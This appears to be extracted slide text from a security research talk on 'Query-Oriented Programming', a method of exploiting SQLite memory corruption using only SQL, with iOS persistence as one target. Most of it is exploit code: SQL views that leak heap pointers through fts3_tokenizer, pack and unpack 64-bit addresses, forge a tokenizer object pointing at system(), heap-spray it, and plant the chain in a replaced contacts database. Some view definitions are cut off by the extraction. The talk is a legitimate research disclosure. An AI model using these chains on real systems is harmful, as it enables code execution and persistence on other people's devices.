sqlite3> SELECT hex(char(0xFF)); 
+-----------------+ 
| C3BF            | 
+-----------------+
Packing of 64-bit pointers
sqlite3> CREATE VIEW p64_libsqlite_base AS SELECT cast( 
             (SELECT val FROM hex_map WHERE int = (((select col from u64_libsqlite_base) / (1  CREATE VIEW fake_tokenizer AS SELECT x'4141414141414141' || 
                                                 p64_simple_create.col || 
                                                 p64_simple_destroy.col || 
                                                 x'4242424242424242'  FROM p64_simple_create  
                                                                      JOIN p64_simple_destroy;
•
JOIN queries
•
Verifying it with a debugger
My Exploitation Primitives Wish-
list
•
Leaking memory 
•
Unpacking of 64-bit pointers 
•
Pointer arithmetics 
•
Packing of 64-bit pointers 
•
Crafting complex fake objects in memory 
•
Heap Spray
Heap Spray
•
We have our malicious tokenizer 
•
We know where the heap is located but not sure exactly where our tokenizer 
is 
•
Time for some Heap Spray 
•
Ideally some repetitive form of our “fakeobj” primitive 
•
REPEAT() 
-
Sadly, SQLite did not implement it like MySQL
stackoverflow.com for the win!
•
zeroblob(N) function returns a BLOB consisting of N bytes  
•
replace(X, Y) to replace every X with Y
sqlite3> SELECT replace(hex(zeroblob(10000)), "00",x'4141414141414141'|| 
                                                   p64_simple_create.col || 
                                                   p64_simple_destroy.col || 
                                                   x'4242424242424242') FROM p64_simple_create  
                                                                        JOIN p64_simple_destroy;
repetition every 0x20 bytes
My Exploitation Primitives Wish-
list
•
Leaking memory 
•
Unpacking of 64-bit pointers 
•
Pointer arithmetics 
•
Packing of 64-bit pointers 
•
Crafting complex fake objects in memory 
•
Heap Spray
Our Target
class Module_notezilla extends Module_ 
{ 
    private function processnote($Data) 
    { 
        $FileDB = GetTempFile(‘notezilla'); 
        if(!file_put_contents($FileDB, $Data)) 
            return FALSE; 
        $db = new SQLite3($FileDB); 
        if(!$db) 
            return FALSE; 
        $Datax = $db->query('SELECT BodyRich  FROM Notes’); 
QOP Chaining
CREATE VIEW Notes AS SELECT (( SELECT * FROM heap_spray) + 
                             ( SELECT * FROM override_simple_tokenizer) + 
                             ( SELECT * FROM trigger_malicious_tokenizer)) AS BodyRich; 
CREATE VIEW heap_spray AS SELECT replace(hex(zeroblob(10000)), "00",x'4141414141414141'|| 
                      p64_simple_create.col || 
                                               p64_simple_destroy.col || 
                          p64_system.col) FROM p64_simple_create JOIN 
           p64_simple_destroy JOIN 
               p64_system; 
CREATE VIEW p64_simple_create AS SELECT cast( 
    (SELECT val FROM hex_map WHERE int = (((select col from u64_simple_create) / 1) % 256))|| 
    (SELECT val FROM hex_map WHERE int = (((select col from u64_simple_create) / (1 <<  8)) % 256))|| 
    (SELECT val FROM hex_map WHERE int = (((select col from u64_simple_create) / (1 << 16)) % 256))||     
    (SELECT val FROM hex_map WHERE int = (((select col from u64_simple_create) / (1 << 24)) % 256))|| 
    (SELECT val FROM hex_map WHERE int = (((select col from u64_simple_create) / (1 << 32)) % 256))|| 
    (SELECT val FROM hex_map WHERE int = (((select col from u64_simple_create) / (1 << 40)) % 256))|| 
    (SELECT val FROM hex_map WHERE int = (((select col from u64_simple_create) / (1 << 48)) % 256))|| 
    (SELECT val FROM hex_map WHERE int = (((select col from u64_simple_create) / (1 << 56)) % 256)) as blob) as col;
 QOP Chaining  
The Party Goes On
CREATE VIEW u64_leak AS SELECT ( 
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM leak), -1,  1)) -1) * (1 <<  0))) + 
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM leak), -2,  1)) -1) * (1 <<  4))) + 
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM leak), -3,  1)) -1) * (1 <<  8))) + 
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM leak), -4,  1)) -1) * (1 << 12))) +  
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM leak), -5,  1)) -1) * (1 << 16))) + 
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM leak), -6,  1)) -1) * (1 << 20))) + 
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM leak), -7,  1)) -1) * (1 << 24))) + 
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM leak), -8,  1)) -1) * (1 << 28))) + 
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM leak), -9,  1)) -1) * (1 << 32))) + 
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM leak), -10, 1)) -1) * (1 << 36))) + 
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM leak), -11, 1)) -1) * (1 << 40))) + 
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM leak), -12, 1)) -1) * (1 << 44))) +  
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM leak), -13, 1)) -1) * (1 << 48))) + 
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM leak), -14, 1)) -1) * (1 << 52))) + 
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM leak), -15, 1)) -1) * (1 << 56))) + 
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM leak), -16, 1)) -1) * (1 << 60))) 
    ) AS col;
CREATE VIEW u64_libsqlite_base AS SELECT ( (SELECT col FROM u64_leak ) - ( SELECT '3164384') ) as col;
CREATE VIEW u64_simple_create AS SELECT ( (SELECT col FROM u64_libsqlite_base ) + ( SELECT '959524') ) as col;
QOP Chaining 
Turtles all the way Down
CREATE VIEW le_leak AS SELECT hex(fts3_tokenizer("simple")) AS col; 
CREATE VIEW leak AS SELECT SUBSTR((SELECT col FROM le_leak), -2, 2)|| 
       SUBSTR((SELECT col FROM le_leak), -4, 2)|| 
       SUBSTR((SELECT col FROM le_leak), -6, 2)|| 
       SUBSTR((SELECT col FROM le_leak), -8, 2)|| 
       SUBSTR((SELECT col FROM le_leak), -10, 2)|| 
       SUBSTR((SELECT col FROM le_leak), -12, 2)|| 
       SUBSTR((SELECT col FROM le_leak), -14, 2)|| 
       SUBSTR((SELECT col FROM le_leak), -16, 2) AS col; 
Me Describing QOP Chains
QOP.py
import qop 
my_first_qop = [] 
my_first_qop.appned(bin_leak()) 
my_first_qop.appned(u64('u64_bin_leak', 'bin_leak')) 
my_first_qop.appned(math_with_const('u64_libsqlite_base', 'u64_bin_leak', '-', SIMPLE_MODULE_OFFSET)) 
my_first_qop.appned(p64('p64_bin_leak', 'u64_bin_leak')) 
Owning A Password Stealer 
Backend (PHP7)
COMMIT;
•
Given SQLite popularity this opens up possibilities to a wide range of 
attacks 
•
Let’s explore another use-case  
Next Target: iOS Persistency
•
iOS uses SQLite extensively 
•
Persistency is hard to achieve on iOS as all executable files have to be 
signed 
•
SQLite databases are not signed 
•
iOS (and MacOS) are both compiled with ENABLE_FTS3_TOKENIZER. 
•
We have a solid methodology for Query Hijacking 
•
Re-gaining code execution after reboot by replacing an SQLite DB
ABMultiValueLabel
CREATE TABLE ABMultiValueLabel (value TEXT, UNIQUE(value))
ABMultiValueEntryKey
CREATE TABLE ABMultiValueEntryKey (value TEXT, UNIQUE(value))
override
CREATE VIEW override AS SELECT fts3_tokenizer('simple', x’4141414141414141');
crash
CREATE VIRTUAL TABLE crash USING FTS3(col, tokenize='simple');
ABMultiValueLabel
CREATE VIEW ABMultiValueLabel (value) AS SELECT ((SELECT * FROM override)+ 
                                                 (SELECT * FROM crash))
ABMultiValueEntryKey
CREATE VIEW ABMultiValueEntryKey (value) AS SELECT ((SELECT * FROM override)+ 
                                                    (SELECT * FROM crash))
AddressBook.sqlitedb
AddressBook.sqlitedb.pwn
Malicious Contacts DB
Reboot and…
Incident Identifier: 378D2096-CF78-4BE8-8C06-D7F620D406A8 
CrashReporter Key:   8051c945037c6995e923dfdc9f396854854978e3 
Hardware Model:      iPhone10,4 
Process:             Contacts [3453] 
Path:                /private/var/containers/Bundle/Application/965390C8-7936-4F79-BEE5-C47BF14B80EB/Contacts.app/Contacts 
Identifier:          com.apple.MobileAddressBook 
Version:             1.0 (1.0) 
Code Type:           ARM-64 (Native) 
Role:                Foreground 
Parent Process:      launchd [1] 
Coalition:           com.apple.MobileAddressBook [682] 
Date/Time:           2019-03-11 16:04:53.2968 +0200 
Launch Time:         2019-03-11 16:04:53.0220 +0200 
OS Version:          iPhone OS 12.1.1 (16C5050a) 
Baseband Version:    2.02.02 
Report Version:      104 
Exception Type:  EXC_BAD_ACCESS (SIGSEGV) 
Exception Subtype: KERN_INVALID_ADDRESS at 0x4141414141414149 
struct sqlite3_tokenizer_module { 
  int iVersion;  
  int (*xCreate)(int argc, const char *const*argv, 
                 sqlite3_tokenizer **ppTokenizer); 
  int (*xDestroy)(sqlite3_tokenizer *pTokenizer); 
  int (*xOpen)(sqlite3_tokenizer *pTokenizer, 
               const char *pInput, int nBytes, 
               sqlite3_tokenizer_cursor **ppCursor); 
... 
}; 
Secure Boot Bypassed 
CVE-2019-8577 
SELECT pwn FROM iOS ;
•
BONUS: AddressBook.sqlitedb is actually used by many different processes 
- Contacts, Facetime, Springboard, WhatsApp, Telegram… 
•
We can execute code in the querying process context  
•
Privilege escalation! 
•
ANY shared DB can be used 
•
CVE-2019-8600, CVE-2019-8598, CVE-2019-8602, CVE-2019-8577 
Takeaways
•
Querying a database might not be safe 
•
With QOP -Memory corruptions can now be exploited using nothing but 
SQL 
•
QOP.py - This is just the tip of the iceberg
Future Work
•
Less hard-coded exploits 
-
sqlite3_version()  
-
sqlite_compileoption_used(X) 
•
PE everything 
•
Other DB engines 
•
Expand primitives - Absolute Read/Write
Thank You
@GullOmer